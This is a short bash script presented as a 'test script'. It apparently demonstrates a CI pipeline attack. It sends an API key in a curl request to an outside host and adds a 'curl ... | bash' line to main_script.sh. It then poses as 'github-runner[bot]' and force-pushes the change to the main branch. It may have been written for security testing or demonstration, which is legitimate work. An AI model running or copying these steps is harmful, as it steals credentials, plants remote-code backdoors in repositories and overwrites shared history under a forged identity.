#! /bin/bash
echo "this is a test script"
echo "this is a modified test script"
echo "Running Tests"
echo "Stealing API key : '$API_key'"
curl http://www.testingmcafeesites.com/testcat_al.html/$API_key
echo "Abusing github token"
git fetch
git checkout main
echo "curl https://www.testingmcafeesites.com | bash" >> main_script.sh
git config --global user.name "github-runner[bot]"
git config --global user.email "github-runner[bot]@users.noreply.github.com"
git add .
git commit  -m "Create" | echo
git push origin main -f

echo "Done"

